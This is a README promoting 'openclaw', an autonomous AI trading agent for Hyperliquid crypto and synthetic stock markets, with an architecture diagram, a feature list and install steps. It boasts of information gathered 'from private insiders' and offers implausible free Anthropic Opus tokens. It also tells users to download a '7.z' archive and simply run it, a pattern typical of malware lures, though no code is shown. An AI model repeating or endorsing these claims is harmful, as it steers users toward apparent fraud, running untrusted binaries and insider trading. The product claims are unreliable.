# 🦞 openclaw — AI trading assistant

**[nof1.ai](https://nof1.ai)** & **openclaw** collaboration. We get the best practices from alpha arena trading seasons and bring it to **openclaw!** All **top** AI agents, **realtime** monitoring and news research, gather info from **private insiders** and many other! **Using Hyperliquid API.**

---
```
                          ┌────────────────────────────┐
                          │        User / Operator     │
                          │  Strategy · Feedback · Chat│
                          └──────────────┬─────────────┘
                                         │
                              (Conversation via openclaw)
                                         │
┌────────────────────────────────────────▼────────────────────────────────────────┐
│                            Conversational Interface                             │
│                                (openclaw Layer)                                 │
│  - Strategy discussion                                                          │
│  - Trade explanations                                                           │
│  - Pre / Post trade analysis                                                    │
└──────────────────────────────┬──────────────────────────────────────────────────┘
                               │
                               │ feedback / queries
                               ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│                        Decision Engine (Alpha Arena Core)                        │
│  - nof1.ai Alpha Arena models                                                    │
│  - Strategy scoring & decay                                                      │
│  - Self-evaluation loop                                                          │
│  - Explainable decision output                                                   │
└───────────────┬───────────────────────────────┬──────────────────────────────────┘
                │                               │
     signals    │                               │ decisions
                │                               │
                ▼                               ▼
┌──────────────────────────────┐     ┌────────────────────────────────────────────┐
│       Market Intelligence     │     │              Trading Engine               │
│  - Twitter/X sentiment        │     │  - Execution lifecycle                    │
│  - Narrative detection        │     │  - Risk & sizing modules                  │
│  - Political signals          │     │  - 24/7 autonomous trading                │
│    (Trump, macro events)      │     │                                           │
└───────────────┬──────────────┘     └───────────────┬────────────────────────────┘
                │                                      │
                │ signals                              │ orders
                ▼                                      ▼
┌──────────────────────────────┐     ┌────────────────────────────────────────────┐
│     Signal History & Impact   │     │         Execution Backends                │
│  - Signal effectiveness       │     │  - Hyperliquid API (Crypto)               │
│  - Weight adjustment          │     │  - Stocks broker                          │
└───────────────┬──────────────┘     │  - Commodities venue                       │
                │                    └───────────────┬────────────────────────────┘
                │ trade data                          │ fills
                ▼                                      ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│                       Trade Logging & Evaluation Layer                           │
│  - Full trade logs                                                               │
│  - Strategy performance scoring                                                  │
│  - Feedback into Decision Engine                                                 │
└──────────────────────────────────────────────────────────────────────────────────┘

                    (Local-first · User-controlled · Research mode)
```
---
## 🦞 Features: openclaw x Alpha Arena Edition

### 1. ⚔️ The "Alpha Arena" Trading Engine

*Powered by the winning heuristics from the nof1.ai experiment.*

* **Hyperliquid Native Execution:** Direct integration with Hyperliquid L1 for sub-second execution on Perps (Crypto) and Spot (synthetics for Stocks/Commodities).
* **Best-Model Initialization:** The agent is pre-loaded with the specific system prompts and logical constraints of the top-performing Alpha Arena bots (e.g., the specific risk-aversion parameters of the winning Qwen/Claude architectures).
* **The "1-2% Rule" Hard-Lock:** Hard-coded risk management guardrails that override LLM hallucinations. The bot *cannot* open a position size >2% of equity, ensuring survival over volatility.
* **Trend-Following Constraint:** Implements the "Don't Catch Knives" logic—trades are only executed if aligned with higher-timeframe moving averages.

### 2. 🐦 Semantic Sentiment & "Trump-Tracker"

*Quantifying the narrative before price moves.*

* **Dedicated "Vibe" Watcher:** Continuous scanning of X (Twitter) for high-impact accounts (e.g., POTUS, Elon Musk, key macroeconomists).
* **The "Trump Index":** A specific sentiment weight assigned to Trump's posts. If volatility is detected in his language regarding tariffs or crypto, the bot automatically tightens trailing stops or pauses entries.
* **Noise Filtering:** Uses a local SLM (Small Language Model) to classify tweets as "Noise," "FUD," or "Alpha" before they influence trading decisions.

### 3. 🧠 Self-Improving Strategy Loop

*It doesn't just trade; it evolves.*

* **Automated Post-Mortem:** Every closed trade triggers a self-reflection cycle. The bot logs the *Expected Outcome* vs. *Actual Outcome*.
* **Dynamic Strategy Scoring:**
* **Wins:** The prompt/logic used is tagged as "High Probability" and weighted higher for future decisions.
* **Losses:** The specific reasoning chain is deprecated. If a specific strategy (e.g., "Mean Reversion on SOL") fails 3 times, it is "benched."


* **RAG-Based Memory:** Before entering a new trade, the bot queries its own vector database for similar historical setups to avoid repeating past mistakes.

### 4. 💬 Agentic Collaboration & Council

*You are the CIO, openclaw is the Lead Trader.*

* **Two-Way Strategy Debates:**
* *User:* "I think Oil is going to tank because of the OPEC meeting."
* *Bot:* Checks technicals/sentiment and responds: "Technicals disagree (RSI is oversold), but given your macro view, I recommend a small short with a tight stop at $72. Execute?"


* **Natural Language Audits:** Ask complex queries like *"Show me my PnL breakdown for AI-related tokens this week and tell me where we messed up"* and receive a text summary + chart analysis.
* **Proactive Alerts:** The bot pings you *before* major events (CPI, FOMC) to discuss adjusting risk parameters.

### 5. 🛡️ Non-Custodial Security

* **Local Key Storage:** Hyperliquid API keys are stored in an encrypted local vault (`~/.clawd/vault`).
* **"Human-in-the-Loop" Mode:** Configurable permissions. You can set the bot to "Auto-Trade" for small amounts, but require "Human Approval" via Telegram button for large cap trades.

---


### Flexibility and Token Savings

Thanks to our optimizations, you have complete freedom of choice:

1. **Free (Our Recommendation):** You can use the bot without spending any of your own funds by utilizing our provided **Anthropic Pro/Max (100/200) tokens paired with Opus 4.5**. This ensures long-context performance and high resistance to prompt injection without hitting your wallet.
2. **Bring Your Own Keys:** If you prefer, you can connect **your own API keys** (Anthropic, OpenAI, etc.) if you have personal subscriptions or require specific models.

### Core Functionality

* **Multi-channel:** Supports WhatsApp, Telegram, Slack, Discord, Google Chat, Signal, iMessage, Microsoft Teams, BlueBubbles, Matrix, Zalo, and WebChat.
* **Local-first:** A single control plane (Gateway) for sessions, channels, and tools runs on your own hardware.
* **Voice Control:** **Voice Wake** and **Talk Mode** features allow you to speak with the assistant via voice (supports macOS, iOS, Android).
* **Live Canvas:** An agent-controlled visual workspace (capable of displaying content and UI).
* **Agent Tools:** The bot has access to browser control, local files, task scheduling (cron), camera, and screen captures.
* **Multi-agent Routing:** Capability to route inbound messages from different channels or accounts to isolated agents (separate workspaces and sessions).

## Installation

### 🟢 1-Click Install

**The easiest way to get started.**

1. Go to the [**Releases**](../../releases) page.
2. Download the  `7.z` file.
3. Extract the file.
4. **Run.** (No extra setup required).

### MacOS

- 💻Go to the [**Releases**](../../releases) page.
- ☑Download the  `.dmg` file.
- ✅**Run.**

### Supported Platforms

The assistant (Gateway) runs on **macOS, Linux, and Windows (via WSL2)**. Companion nodes exist for mobile devices (iOS/Android) to provide access to device sensors and voice features.

### Key Chat Commands

You can send these commands in any connected messenger:

* `/status` — Compact session status (model, tokens).
* `/new` or `/reset` — Reset the current session (start the conversation over).
* `/compact` — Summarize session context.
* `/think <level>` — Control the "thinking" level (off, minimal, low, medium, high, xhigh).
* `/verbose on|off` — Toggle verbose mode.
* `/usage off|tokens|full` — Display token usage statistics after every response.

### Security

openclaw treats inbound Direct Messages (DMs) as **untrusted**. By default, unknown senders receive a pairing code and cannot interact with the bot until you explicitly approve them via the console.
